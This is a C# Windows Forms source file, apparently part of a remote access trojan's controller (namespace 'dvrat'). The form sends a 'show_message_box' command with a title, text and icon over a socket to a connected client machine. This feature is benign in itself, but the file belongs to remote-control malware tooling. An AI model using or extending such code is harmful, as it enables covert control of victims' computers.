using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace dvrat
{
    public partial class ConfigMessageBox : Form
    {
        private MainForm _parent;
        private Socket _client;
        public ConfigMessageBox(Socket client,MainForm parent)
        {
            InitializeComponent();
            this._parent = parent;
            this._client = client;
        }
        string message_box_tag = "show_message_box;\n";
        private void config_message_box_Load(object sender, EventArgs e)
        {
          
        }

        private void send_button_Click(object sender, EventArgs e)
        {

            if (title_textbox.Text == null || title_textbox.Text == "")
            {
                MessageBox.Show("write something is title");
                goto do_not_do_any_thing;
            }

            if (message_textbox.Text == null || message_textbox.Text == "")
            {
                MessageBox.Show("write something is message");
                goto do_not_do_any_thing;
            }
        
            if (this.message_box_ico_checkbox.GetItemChecked(0))
            {
                message_box_tag += title_textbox.Text + "\n" + message_textbox.Text + "\n" + "ER";
            }else if (this.message_box_ico_checkbox.GetItemChecked(1))
            {
                message_box_tag += title_textbox.Text + "\n" + message_textbox.Text + "\n" + "QU";
            }else if (this.message_box_ico_checkbox.GetItemChecked(2))
            {
                message_box_tag += title_textbox.Text + "\n" + message_textbox.Text + "\n" + "WA";
            }else if (this.message_box_ico_checkbox.GetItemChecked(3))
            {
                message_box_tag += title_textbox.Text + "\n" + message_textbox.Text + "\n" + "IN";
            }
            else
            {
                MessageBox.Show("Choose one ico !");
                goto do_not_do_any_thing;
            }
            if(this._parent.send_to_client(this._client, this.message_box_tag))
            {
                this.Close();
            }
            else
            {
                MessageBox.Show("Error while send message box tags!!!");
            }
        do_not_do_any_thing:;
        }
    }
}
